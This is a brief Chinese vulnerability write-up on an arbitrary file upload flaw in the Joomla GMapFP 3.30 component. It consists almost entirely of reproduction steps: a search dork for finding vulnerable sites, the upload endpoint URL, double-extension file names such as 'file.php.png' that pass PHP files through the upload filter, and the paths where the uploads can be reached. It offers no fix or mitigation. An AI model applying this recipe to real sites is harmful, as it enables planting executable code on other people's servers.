Joomla component GMapFP 3.30 任意文件上传
=========================================

一、漏洞简介
------------

关键字:inurl:\'\'com\_gmapfp\'\'

二、漏洞影响
------------

Joomla Gmapfp Components 3.x

三、复现过程
------------

    http://www.0-sec.org/index.php?option=comgmapfp&controller=editlieux&tmpl=component&task=upload_image
    file.php.png , file2.php.jpeg , file3.html.jpg ,file3.txt.jpg

目录文件路径

    http://www.0-sec.org/images/gmapfp/file.php
    http://www.0-sec.org/images/gmapfp/file.php.png
